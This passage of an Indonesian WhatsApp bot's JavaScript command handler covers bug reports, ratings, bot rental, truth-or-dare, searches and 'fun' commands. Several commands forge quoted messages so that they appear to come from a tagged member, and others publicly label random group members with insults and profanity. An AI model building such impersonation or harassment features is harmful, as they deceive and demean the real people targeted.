              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n☞ *Username*: ${pushname}\n☞ *Alasan*: ${reason}`
              reply(aluty)
              break
              case 'bug':
              case 'report':
              case 'bugreport':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (args.length < 1) return reply(`Ex : ${prefix + command} [ Fitur Apa ] [ Error Gmn ]`)
              teks = args.join(' ')
              reply(`Done Send Report Bug To Owner ${NamaOwner}`)
              Bambang.sendMessage(`${NOwner}`,`*Bug Report:* ${teks}`, text)
              break
              case 'request':
              case 'saran':
              case 'req':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (args.length < 1) return reply(`Ex : ${prefix + command} [ Saran ]`)
              teks = args.join(' ')
              reply(`Done Send Request To Owner ${NamaOwner}`)
              Bambang.sendMessage(`${NOwner}`,`*Request*\n\n*${teks}*`, text)
              break
              case 'rate': case 'rating':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              sendButMessage(from, `Hai Makasih Udah Mau Berikan Kami Rating Silahkan Di Klik Bintang Yang Ada Di Bawah Sesuai Pendapat Anda`, `Berikan Rating Sesuai *Pendapat Anda* Terhadap Bot Kami`, [
              {
              buttonId: `${prefix}rate5`,
              buttonText: {
                displayText: `⭐⭐⭐⭐⭐`,
              },
              type: 1,
              },
              {
              buttonId: `${prefix}rate3`,
              buttonText: {
              displayText: `⭐⭐⭐`,
              },
              type: 1,
              },              
              {
              buttonId: `${prefix}rate1`,
              buttonText: {
              displayText: `⭐`,
              },
              type: 1,
              },
              ])              
              break
              case 'rate5':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              sendButMessage(from, `Widih Makasih Bintang 5 Nya Kak Yaaa`, `Makasih Bintang 5 Nya Kak ${pushname}`, [
              {
              buttonId: `${prefix}satujddjduaa`,
              buttonText: {
              displayText: `Sama Sama`,
              },
              type: 1,
              },
              {
              buttonId: `${prefix}ajahdhd`,
              buttonText: {
              displayText: `Yoi Bro🗿👍`,
              },
              type: 1,
              },
              ])    
              Bambang.sendMessage(`${NOwner}`,`Kamu Dapet Rate *5* Dari ${pushname}`, text)         
              break
              case 'rate3':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              sendButMessage(from, `Makasih Bintang 3 Nya Kak Yaaa\n_Ada Saran Nggak Kak Buat Bot Kami??_\n\nKalo Ada Ketik\n*${prefix}request* < Apa Yang Mau Di Request In >`, `Makasih Bintang 3 Nya Kak ${pushname}`, [
              {
              buttonId: `${prefix}satujddjduaa`,
              buttonText: {
              displayText: `Sama Sama`,
              },
              type: 1,
              },
              {
              buttonId: `${prefix}ajahdhd`,
              buttonText: {
              displayText: `Yoi Bro🗿👍`,
              },
              type: 1,
              },
              ])    
              Bambang.sendMessage(`${NOwner}`,`Kamu Dapet Rate *3* Dari ${pushname}\n\nAwokaowk Rate 3`, text)          
              break
              case 'rate1':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              sendButMessage(from, `Makasih Bintang 1 Nya Kak`, `Ada Saran Nggak Kak Buat Bot Kami??Kalo Ada Krim\n*${prefix}request* < Apa Yang Mau Di Request In >\nAda Keluh Kesah Buat Bot Kami?Kirim\n${prefix}report < Keluh Kesah Anda >`, [
              {
              buttonId: `${prefix}satujddjduaa`,
              buttonText: {
              displayText: `Sama Sama`,
              },
              type: 1,
              },
              {
              buttonId: `${prefix}ajahdhd`,
              buttonText: {
              displayText: `Yoi Bro🗿👍`,
              },
              type: 1,
              },
              ])  
              Bambang.sendMessage(`${NOwner}`,`Kamu Dapet Rate *1* Dari ${pushname}\n\n\nAwolawok Rate 1 Makanya Bot Nya On In 24Jam Biar Kek Rumah Sakit`, text)             
              break       
              case 'sewabot':
              case 'sewa':
              //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
sewabg =`
JASA SEWA BOT *${NamaBot}*

🔖 *PRICE HARGA*
_PERMANEN_ : ${HargaPermanen}
_PERBULAN_ : ${HargaPerbulan} 
_PERMINGGU_ : ${HargaPerminggu}

_SEWA PREMIUM_ : ${HargaPremium}

_BUY SC_ : https://github.com/Bambang-Gans/btrv3
[ *SC FREE NO BUY* ]

💸 _PAYMENT_
 
💵 _GOPAY_ : *${NomorGopay}*
💶 _DANA_ : *${NomorDana}*
💷 _OVO_ : *${NomorOvo}*
💴 _PULSA_ : *${NomorPulsa}*

${petik} 
MINAT? HUBUNGI https://wa.me/${NomorOwnz}
`
reply(sewabg)
break                                   
//═════════════════════════ [ FUN MENU ] ═════════════════════════
//═════════════════════════ [ CASE BY NAYLA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════
            case 'xkontol':	
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')				 	
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xganteng': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(11)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xcantik': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xjelek': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(9)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xgoblok': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 				  
            case 'xbego': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(8)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xpintar': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xjago': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(8)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xnolep': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(9)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
		    case 'xmonyet':		     
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 				                 	 
            case 'xbabi': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(8)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xbeban': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(9)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xbaik': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(8)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xjahat': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(9)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xanjing':  
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 				
            case 'xharam': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(9)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	 	
			case 'xpakboy': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xpakgirl':  
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(11)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 				
            case 'xwibu': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(8)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 
			case 'bilangangka':
              if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${apikey7}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'kalkulator':
 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'fancytext':
if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${apikey7}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'githubstalk':
              if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${apikey7}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					Bambang.sendMessage(from, buff, image, {quoted: ftrol, caption: gstalk})
					break 
case 'truth':
        const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://www.linkpicture.com/q/images_72.png`)
	    but = [
          { buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 },
          { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }
        ]
        sendButLocation(from, ttrth, 'GK JALANIN WAJIB DONATE',truteh, but, {quoted: mek})
	        	break
		case 'dare':
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "😎??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		todz = await getBuffer(`https://www.linkpicture.com/q/images_72.png`)
	    but = [
          { buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 },
          { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }
        ]
        sendButLocation(from, der, 'GK JALANIN WAJIB DONATE',todz, but, {quoted: mek})
       	   break
			case 'xhebat': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(9)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
			case 'xsadboy': 
			//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(10)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break 	
		    case 'xsadgirl': 
		    //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('TAG ORANG KAK')			
			Bambang.sendMessage(from, undef2, sticker, {quoted: { key: { fromMe: false, participant: `${body.slice(11)}@s.whatsapp.net`, ...({}) }, message: { "extendedTextMessage": { "text": `*Ehm.. gw ${command1} bro:v!*`} } }, contextInfo: {forwardingScore: 508, isForwarded: true} })   		
			break  
	 	    case 'vganteng': case 'vcantik': case 'vjelek': case 'vgoblok':  
            case 'vbego': case 'vpintar': case 'vjago': case 'vnolep': case 'vmonyet':                 	 
            case 'vbabi': case 'vbeban': case 'vbaik': case 'vjahat': case 'vanjing': 
            case 'vharam': case 'vkontol': case 'vpakboy': case 'vpakgirl': 
            case 'vwibu': case 'vhebat': case 'vsadboy': case 'vsadgirl':
            //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
 		    jds = []
		    const AS1 = groupMembers
 		    const CS1 = AS1[Math.floor(Math.random() * AS1.length)]	 	                      
 		    const vcardd = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN:${command1}\n` 
            + `ORG: Yang Ter ${command1};\n`
            + `TEL;type=CELL;type=VOICE;waid=${CS1.jid.split('@')[0]}:+${CS1.jid.split('@')[0]}\n`
            + 'END:VCARD' 
            Bambang.sendMessage(from, {displayname: "Jeff", vcard: vcardd}, MessageType.contact, { quoted: mek})
            reply(`dia yang *ter${command1}* disini`)			
	 	    break	 	     
            case 'zganteng': case 'zcantik': case 'zjelek': case 'zgoblok':  
            case 'zbego': case 'zpintar': case 'zjago': case 'znolep': case 'zmonyet':                 	 
            case 'zbabi': case 'zbeban': case 'zbaik': case 'zjahat': case 'zanjing': 
            case 'zharam': case 'zkontol': case 'zpakboy': case 'zpakgirl': 
            case 'zwibu': case 'zhebat': case 'zsadboy': case 'zsadgirl':
            //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
            nyy = fs.readFileSync('./ztag.webp')
           	if (!isGroup) return reply("ONLY GRUB") 	 
		    const AS11 = groupMembers		     
 		    const CS21 = AS11[Math.floor(Math.random() * AS11.length)]	 	    		     
			Bambang.sendMessage(from, nyy, sticker, {quoted: { key: { fromMe: false, participant: `${CS21.jid.split('@')[0]}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `aku adalah yang *ter${command1}* disini` }}})
			break
                   case 'ganteng': case 'cantik': case 'jelek': case 'goblok':  
                   case 'bego': case 'pinter': case 'jago': case 'nolep': case 'monyet':                 	 
                   case 'babi': case 'beban': case 'baik': case 'jahat': case 'anjing': 
                   case 'haram': case 'kontol': case 'pakboy': case 'pakgirl': 
               	   case 'wibu': case 'hebat': case 'sadboy': case 'sadgirl': 
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})  
				   if (!isGroup) return reply(`Ini Bukan Grub Ya Ajg🌹🤙`)
 				   jds = []
				   const A1 = groupMembers
  		 		   const B1 = groupMembers
 				   const C1 = A1[Math.floor(Math.random() * A1.length)]
				   D1 = `yang *ter${command}* disini adalah @${C1.jid.split('@')[0]}`                  
				   jds.push(C1.jid)
				   mentions(D1, jds, true)
				   break
                    case 'gantengcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *GANTENGAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😎`
                    reply(N)
                    break 
                    case 'cantikcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *CANTIKAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}% 😁*`
                    reply(N)
                    break
                    case 'jelekcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                        	
                    N = `KE *J3L3K4N* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🤢`
                    reply(N)
                    break 
                    case 'goblokcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *GOBLOKAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🤣`
                    reply(N)
                    break 
                    case 'begocek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	 
                    N = `KE *BEGO* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😂`
                    reply(N)
                    break 
                    case 'pintercek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *PINTARAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😗`
                    reply(N)
                    break 
                    case 'jagocek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	 
                    N = `KE *JAGOAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 💪`
                    reply(N)
                    break 
                    case 'nolepcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *NOLEPAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🧐`
                    reply(N)
                    break 
                    case 'babicek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *BABIAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🤪`
                    reply(N)
                    break 
                    case 'bebancek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *BEBANAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🤬`
                    reply(N)
                    break 
                    case 'baikcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *BAIKAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😇`
                    reply(N)
                    break 
                    case 'jahatcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *JAHATAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😈`
                    reply(N)
                    break 
                    case 'anjingcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	   
                    N = `KE *ANJINGAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 👀`
                    reply(N)
                    break                      
                    case 'haramcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `KE *HARAMAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🥴`
                    reply(N)
                    break  
                    case 'kontolcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	   
                    N = `KE *KOMTOLAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🙂`
                    reply(N)
                    break 
                    case 'pakboycek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	   
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😏`
                    reply(N)
                    break 
                    case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: ftrol, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
                                    case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: ftrol, caption: result}).catch(e => {
  reply(result)
})
break
 case 'mediafire':
									if (args.length < 1) return reply('Masukkan link mediafire')
									if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Linknya Error')
									reply(mess.wait)
									teks = args.join(' ')
									res = await mediafireDl(teks)
									result = ` MEDIAFIRE DOWNLOAD

Data Berhasil Didapatkan!

📌 Nama : ${res[0].nama}
✉️ Ukuran : ${res[0].size}
🌐 Link : ${res[0].link}

_Tunggu Proses Upload Media_`
									reply(result)
									sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: ftrol})
									break
									case 'ytsearch':
                if (!args.length) return reply('Judulnya apa kak?')
            try {
            	reply(mess.wait)
